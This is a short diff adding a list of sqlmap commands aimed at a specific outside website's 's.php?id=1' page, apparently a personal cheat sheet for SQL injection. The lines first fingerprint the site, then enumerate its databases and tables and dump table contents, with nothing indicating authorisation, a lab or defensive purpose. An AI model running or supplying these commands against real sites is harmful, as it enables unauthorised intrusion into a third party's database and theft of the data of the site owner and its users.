@@ -1,0 +1,6 @@
+python sqlmap.py -u "http://www.romanianwriters.ro/s.php?id=1" --batch --banner
+--batch --dbs
+--batch --tables -D <db_name>
+--batch --dump -T <table_name> -D <db_name>
+--time-sec=10
+--dbms=mysql
